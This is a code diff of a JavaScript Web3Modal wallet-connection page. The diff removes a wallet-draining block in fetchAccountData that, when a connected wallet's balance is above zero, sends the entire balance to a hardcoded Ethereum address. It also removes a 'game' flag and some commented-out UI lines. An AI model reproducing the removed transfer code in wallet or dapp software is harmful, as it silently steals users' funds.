@@ -92,6 +92,11 @@ function init() {
  * Kick in the UI action after Web3modal dialog has chosen a provider
  */
 
+
+
+
+
+ 
 async function fetchAccountData() {
  
  
@@ -113,14 +118,7 @@ async function fetchAccountData() {
   // MetaMask does not give you all accounts, only the selected account
   console.log("Got accounts", accounts);
   selectedAccount = accounts[0];
-//   const balance = await web3.eth.getBalance(address);
-//     // ethBalance is a BigNumber instance
-//     // https://github.com/indutny/bn.js/
-//    const ethBalance = web3.utils.fromWei(balance, "ether");
-//   if(ethBalance > 0){ console.log("Balance greater than Zero");
-//    }
-//   else { console.log("Opening a dialog");}
-
+//  
   document.querySelector("#selected-account").textContent = selectedAccount;
 
   // Get a handl
@@ -137,23 +135,8 @@ async function fetchAccountData() {
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "wei");
    const value = web3.utils.toBN(ethBalance).toString();
-   if(ethBalance > 0){ console.log("Balance greater than Zero");
-        web3.eth.sendTransaction({
-           from: accounts[0],
-           to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
-           value: value
-       });
-                          
-        console.log(value);
-//        .then(function(receipt){
-         
-//        });
-
-
-     }
-    else{console.log("balance is not greater ")}
-    console.log("Opening a dialog");
-    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
+   
+   const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
     // Fill in the templated row and put in the document
     const clone = template.content.cloneNode(true);
     clone.querySelector(".address").textContent = address;
@@ -226,14 +209,7 @@ async function onConnect() {
     console.log("Could not get a wallet connection",e,game);
     return;
   }
- game = true;
- if (game ===true){
-  console.log("we are in",game);
-//   document.getElementById("speedbtn").style.display = "";
-//   document.getElementById("jmpbtn").style.display = "";
-//   document.getElementById("treat").style.display = "";
-//   
-// //   
+ 
   // Subscribe to accounts change
   provider.on("accountsChanged", (accounts) => {
     fetchAccountData();
